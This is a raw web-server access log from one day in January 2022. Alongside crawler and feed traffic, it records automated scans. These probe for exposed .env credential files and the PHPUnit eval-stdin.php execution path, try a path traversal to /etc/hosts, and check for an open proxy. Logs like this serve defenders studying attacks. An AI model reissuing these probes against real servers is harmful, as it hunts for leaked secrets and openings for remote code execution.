192.9.237.155 - - [07/Jan/2022:14:10:16 +0000] "GET //saas/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:16 +0000] "GET //api/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:17 +0000] "GET //psnlink/.env HTTP/1.1" 301 239 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:17 +0000] "GET //exapi/.env HTTP/1.1" 301 237 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:17 +0000] "GET //site/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:17 +0000] "GET //admin/.env HTTP/1.1" 301 237 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:18 +0000] "GET //web/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:18 +0000] "GET //public/.env HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:18 +0000] "GET //en/.env HTTP/1.1" 301 234 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:19 +0000] "GET //tools/.env HTTP/1.1" 301 237 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:19 +0000] "GET //v1/.env HTTP/1.1" 301 234 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:19 +0000] "GET //v2/.env HTTP/1.1" 301 234 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:19 +0000] "GET //administrator/.env HTTP/1.1" 301 245 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:20 +0000] "GET //laravel/.env HTTP/1.1" 301 239 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:20 +0000] "POST / HTTP/1.1" 301 227 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:20 +0000] "POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 283 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:21 +0000] "POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 281 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:21 +0000] "POST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 284 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:21 +0000] "POST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:21 +0000] "POST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 281 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:21 +0000] "POST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:21 +0000] "POST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 281 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:21 +0000] "POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 285 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:22 +0000] "POST //lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 262 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:22 +0000] "POST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 270 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:22 +0000] "POST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 274 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:22 +0000] "POST //lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 266 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:22 +0000] "POST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 281 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:22 +0000] "POST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 281 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:23 +0000] "POST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 283 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:23 +0000] "POST //phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 258 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:23 +0000] "POST //phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 266 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:23 +0000] "POST //phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 270 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:23 +0000] "POST //phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 262 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:23 +0000] "POST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 287 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:23 +0000] "POST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 307 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:24 +0000] "POST //vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 265 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:24 +0000] "POST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 301 273 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:24 +0000] "POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 277 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:24 +0000] "POST //vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 269 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:24 +0000] "POST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 307 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:24 +0000] "POST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 325 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:24 +0000] "POST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 312 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:25 +0000] "POST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 318 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
192.9.237.155 - - [07/Jan/2022:14:10:25 +0000] "POST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 281 "https://www.google.com/" "Mozilla/5.0 (Windows; U; MSIE 7.0; Macintosh; .NET CLR 2.3.5001; Intel Mac OS X 10_5_0)"
193.160.21.36 - - [07/Jan/2022:14:11:30 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.160.21.36 - - [07/Jan/2022:14:11:30 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
36.37.185.102 - - [07/Jan/2022:14:12:04 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
36.37.185.102 - - [07/Jan/2022:14:12:05 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
36.37.185.102 - - [07/Jan/2022:14:12:08 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "-" "python-requests/2.24.0"
127.0.0.1 - - [07/Jan/2022:14:32:40 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
103.254.56.102 - - [07/Jan/2022:14:32:51 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
45.79.148.82 - - [07/Jan/2022:14:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
66.249.80.55 - - [07/Jan/2022:14:43:39 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
90.189.214.151 - - [07/Jan/2022:15:09:13 +0000] "GET / HTTP/1.0" 301 227 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
35.164.205.78 - - [07/Jan/2022:15:11:04 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux i686; rv:55.0) Gecko/20100101 Firefox/55.0"
221.2.155.199 - - [07/Jan/2022:15:29:57 +0000] "GET / HTTP/1.0" 301 227 "-" "Mozilla/5.0"
159.223.169.3 - - [07/Jan/2022:15:32:19 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.223.169.3 - - [07/Jan/2022:15:32:19 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.85.216.231 - - [07/Jan/2022:15:40:16 +0000] "GET /wp-login.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
97.107.132.77 - - [07/Jan/2022:15:41:23 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
91.134.137.101 - - [07/Jan/2022:16:02:55 +0000] "GET /wp-login.php HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
216.244.66.232 - - [07/Jan/2022:16:04:33 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
34.96.130.3 - - [07/Jan/2022:16:25:26 +0000] "GET / HTTP/1.1" 301 228 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
207.46.13.170 - - [07/Jan/2022:16:33:41 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
97.107.132.77 - - [07/Jan/2022:16:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
23.228.70.82 - - [07/Jan/2022:16:52:47 +0000] "GET /File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 301 277 "-" "ALittle Client"
157.90.209.81 - - [07/Jan/2022:17:00:29 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
205.185.114.93 - - [07/Jan/2022:17:13:23 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 400 226 "-" "-"
216.244.66.231 - - [07/Jan/2022:17:13:52 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
127.0.0.1 - - [07/Jan/2022:17:18:34 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
127.0.0.1 - - [07/Jan/2022:17:18:35 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
127.0.0.1 - - [07/Jan/2022:17:18:36 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
127.0.0.1 - - [07/Jan/2022:17:18:37 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
182.121.245.155 - - [07/Jan/2022:17:18:36 +0000] "POST /HNAP1/ HTTP/1.0" 301 236 "-" "-"
127.0.0.1 - - [07/Jan/2022:17:18:49 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
66.249.66.158 - - [07/Jan/2022:17:25:51 +0000] "GET /blog/2011/08/att-2wire-dsl-modem-teardown.html HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
23.228.70.82 - - [07/Jan/2022:17:36:13 +0000] "GET /File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 301 276 "-" "ALittle Client"
143.198.136.88 - - [07/Jan/2022:17:37:56 +0000] "\x16\x03\x01" 400 226 "-" "-"
143.198.136.88 - - [07/Jan/2022:17:37:56 +0000] "GET / HTTP/1.1" 400 226 "-" "-"
143.198.136.88 - - [07/Jan/2022:17:37:56 +0000] "GET / HTTP/1.1" 301 230 "-" "l9tcpid/v1.1.0"
143.198.136.88 - - [07/Jan/2022:17:38:06 +0000] "CONNECT leakix.net:443 HTTP/1.1" 301 227 "-" "Go-http-client/1.1"
143.198.136.88 - - [07/Jan/2022:17:38:06 +0000] "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1" 400 226 "-" "Lkx-TraversalHttpPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)"
143.198.136.88 - - [07/Jan/2022:17:38:06 +0000] "GET /.DS_Store HTTP/1.1" 301 239 "-" "Go-http-client/1.1"
143.198.136.88 - - [07/Jan/2022:17:38:07 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 305 "-" "l9explore/1.3.0"
143.198.136.88 - - [07/Jan/2022:17:38:07 +0000] "GET /s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 301 305 "-" "l9explore/1.3.0"
143.198.136.88 - - [07/Jan/2022:17:38:07 +0000] "GET /.json HTTP/1.1" 301 235 "-" "l9explore/1.3.0"
143.198.136.88 - - [07/Jan/2022:17:38:07 +0000] "GET /server-status HTTP/1.1" 301 243 "-" "l9explore/1.3.0"
143.198.136.88 - - [07/Jan/2022:17:38:08 +0000] "GET /.env HTTP/1.1" 301 234 "-" "l9explore/1.3.0"
143.198.136.88 - - [07/Jan/2022:17:38:08 +0000] "GET /idx_config/ HTTP/1.1" 301 241 "-" "l9explore/1.3.0"
143.198.136.88 - - [07/Jan/2022:17:38:08 +0000] "GET /telescope/requests HTTP/1.1" 301 248 "-" "l9explore/1.3.0"
143.198.136.88 - - [07/Jan/2022:17:38:09 +0000] "GET /info.php HTTP/1.1" 301 238 "-" "l9explore/1.3.0"
172.104.217.53 - - [07/Jan/2022:17:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
85.202.169.115 - - [07/Jan/2022:18:03:55 +0000] "GET / HTTP/1.1" 301 230 "-" "Linux Gnu (cow)"
91.241.19.243 - - [07/Jan/2022:18:17:38 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"
162.0.232.89 - - [07/Jan/2022:18:21:08 +0000] "GET /wordpress/ HTTP/1.1" 301 237 "-" "-"
123.125.109.143 - - [07/Jan/2022:18:32:39 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
192.241.219.130 - - [07/Jan/2022:18:36:47 +0000] "GET /portal/redlion HTTP/1.1" 301 244 "-" "Mozilla/5.0 zgrab/0.x"
172.104.217.53 - - [07/Jan/2022:18:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
198.98.49.124 - - [07/Jan/2022:18:41:41 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
216.244.66.231 - - [07/Jan/2022:18:42:51 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
183.136.225.9 - - [07/Jan/2022:18:57:58 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.9 - - [07/Jan/2022:18:58:00 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.9 - - [07/Jan/2022:18:58:01 +0000] "GET /favicon.ico HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.9 - - [07/Jan/2022:18:58:04 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
216.244.66.232 - - [07/Jan/2022:19:03:21 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
157.55.39.91 - - [07/Jan/2022:19:20:32 +0000] "GET /blog/2014/2/1/Inside%20the%20EDUP%20EP-AB003%202.4GHz%20Amplifier.html HTTP/1.1" 301 287 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
97.107.132.77 - - [07/Jan/2022:19:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
157.55.39.25 - - [07/Jan/2022:19:54:20 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
164.92.221.136 - - [07/Jan/2022:20:01:00 +0000] "\x16\x03\x01\x01\xfc\x01" 400 226 "-" "-"
192.9.237.155 - - [07/Jan/2022:20:07:54 +0000] "GET / HTTP/1.1" 301 227 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:55 +0000] "GET /.env HTTP/1.1" 301 231 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:56 +0000] "GET /.remote HTTP/1.1" 301 234 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:56 +0000] "GET /.local HTTP/1.1" 301 233 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:57 +0000] "GET /.production HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:57 +0000] "GET //vendor/.env HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:58 +0000] "GET //lib/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:58 +0000] "GET //lab/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:59 +0000] "GET //cronlab/.env HTTP/1.1" 301 239 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:59 +0000] "GET //cron/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:07:59 +0000] "GET //core/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:00 +0000] "GET //core/app/.env HTTP/1.1" 301 240 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:00 +0000] "GET //core/Datavase/.env HTTP/1.1" 301 245 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:01 +0000] "GET //database/.env HTTP/1.1" 301 240 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:01 +0000] "GET //config/.env HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:01 +0000] "GET //assets/.env HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:02 +0000] "GET //app/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
